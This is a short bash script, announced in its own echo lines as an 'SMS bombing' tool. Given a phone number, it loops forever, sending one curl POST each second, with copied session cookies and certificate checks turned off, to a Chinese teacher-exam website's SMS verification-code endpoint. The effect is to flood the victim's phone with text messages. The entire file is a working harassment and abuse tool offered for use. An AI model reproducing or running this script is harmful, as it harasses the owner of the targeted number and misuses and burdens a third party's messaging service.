#!/bin/bash

echo "-------start SMS bombing -------------"
echo "--------Miss You Much-----------------"
echo "press ctrl + c to stop the SMS bombing--------- "
echo "please enter the phone number --------------"
echo "${1}"
while :
do
  curl -i -s -k  -X $'POST' \
    -H $'Host: www.hteacher.net' -H $'Connection: close' -H $'Content-Length: 18' -H $'Accept: application/json, text/javascript, */*; q=0.01' -H $'Origin: https://www.hteacher.net' -H $'X-Requested-With: XMLHttpRequest' -H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.131 Safari/537.36' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Referer: https://www.hteacher.net/jiaoshi/20200702/226332.html' -H $'Accept-Encoding: gzip, deflate' -H $'Accept-Language: zh-CN,zh;q=0.9' -H $'Cookie: acw_tc=2760828315936751451454981ee0a5687045afc5fd8f81757c379b2c53a3ed; NTKF_T2D_CLIENTID=guest2A2ACA49-B177-3967-988A-0E70E4442541; nTalk_CACHE_DATA={uid:kf_10092_ISME9754_guest2A2ACA49-B177-39,tid:1593675146308338}; PHPSESSID=3lkna67dt3pc948t3cdbls4h8g; UM_distinctid=1730e7138df716-0ca6f13cb7ef1e-6353160-384000-1730e7138e04de; CNZZDATA4934593=cnzz_eid%3D1939380031-1593670619-%26ntime%3D1593670619; Hm_lvt_72104d9092ca76a85c4e26ebd8fa94f1=1593675168; sajssdk_2015_cross_new_user=1; sensorsdata2015jssdkcross=%7B%22distinct_id%22%3A%221730e7139424d6-0ec74130857efd-6353160-3686400-1730e713943414%22%2C%22first_id%22%3A%22%22%2C%22props%22%3A%7B%22%24latest_traffic_source_type%22%3A%22%E7%9B%B4%E6%8E%A5%E6%B5%81%E9%87%8F%22%2C%22%24latest_search_keyword%22%3A%22%E6%9C%AA%E5%8F%96%E5%88%B0%E5%80%BC_%E7%9B%B4%E6%8E%A5%E6%89%93%E5%BC%80%22%2C%22%24latest_referrer%22%3A%22%22%2C%22%24latest_landing_page%22%3A%22https%3A%2F%2Fwww.hteacher.net%2Fjiaoshi%2F20200702%2F226332.html%22%7D%2C%22%24device_id%22%3A%221730e7139424d6-0ec74130857efd-6353160-3686400-1730e713943414%22%7D; Hm_lpvt_72104d9092ca76a85c4e26ebd8fa94f1=1593675216' \
    -b $'acw_tc=2760828315936751451454981ee0a5687045afc5fd8f81757c379b2c53a3ed; NTKF_T2D_CLIENTID=guest2A2ACA49-B177-3967-988A-0E70E4442541; nTalk_CACHE_DATA={uid:kf_10092_ISME9754_guest2A2ACA49-B177-39,tid:1593675146308338}; PHPSESSID=3lkna67dt3pc948t3cdbls4h8g; UM_distinctid=1730e7138df716-0ca6f13cb7ef1e-6353160-384000-1730e7138e04de; CNZZDATA4934593=cnzz_eid%3D1939380031-1593670619-%26ntime%3D1593670619; Hm_lvt_72104d9092ca76a85c4e26ebd8fa94f1=1593675168; sajssdk_2015_cross_new_user=1; sensorsdata2015jssdkcross=%7B%22distinct_id%22%3A%221730e7139424d6-0ec74130857efd-6353160-3686400-1730e713943414%22%2C%22first_id%22%3A%22%22%2C%22props%22%3A%7B%22%24latest_traffic_source_type%22%3A%22%E7%9B%B4%E6%8E%A5%E6%B5%81%E9%87%8F%22%2C%22%24latest_search_keyword%22%3A%22%E6%9C%AA%E5%8F%96%E5%88%B0%E5%80%BC_%E7%9B%B4%E6%8E%A5%E6%89%93%E5%BC%80%22%2C%22%24latest_referrer%22%3A%22%22%2C%22%24latest_landing_page%22%3A%22https%3A%2F%2Fwww.hteacher.net%2Fjiaoshi%2F20200702%2F226332.html%22%7D%2C%22%24device_id%22%3A%221730e7139424d6-0ec74130857efd-6353160-3686400-1730e713943414%22%7D; Hm_lpvt_72104d9092ca76a85c4e26ebd8fa94f1=1593675216' \
    --data-binary $'mobile='${1} \
    $'https://www.hteacher.net/bigfish/sendphonecode_jyw.php'
  sleep 1s
done

